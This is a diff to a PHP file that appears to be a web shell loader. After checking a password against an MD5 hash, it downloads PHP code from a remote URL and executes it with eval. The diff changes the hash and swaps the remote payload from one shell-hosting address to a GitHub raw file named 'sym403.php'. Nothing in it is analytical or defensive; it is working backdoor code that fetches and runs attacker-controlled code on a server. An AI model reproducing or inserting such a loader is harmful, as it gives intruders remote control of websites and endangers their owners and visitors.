@@ -42,7 +42,7 @@ function is_logged_in() {
 // Check if the password is submitted and correct
 if (isset($_POST['password'])) {
   $entered_password = $_POST['password'];
-  $hashed_password = '717d9bba079ea4be145aadef336da6e4'; // Replace this with your MD5 hashed password
+  $hashed_password = 'd489a3289ecdc847cb67f7a480e6f9fa'; // Replace this with your MD5 hashed password
   if (md5($entered_password) === $hashed_password) {
     // Password is correct, store it in session
     $_SESSION['logged_in'] = true;
@@ -55,7 +55,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-  $a = geturlsinfo('https://shell.prinsh.com/Nathan/alfa.txt');
+  $a = geturlsinfo('https://raw.githubusercontent.com/wonxd1337/Koleksi/main/sym403.php');
   eval('?>' . $a);
 } else {
   // Display login form if not logged in
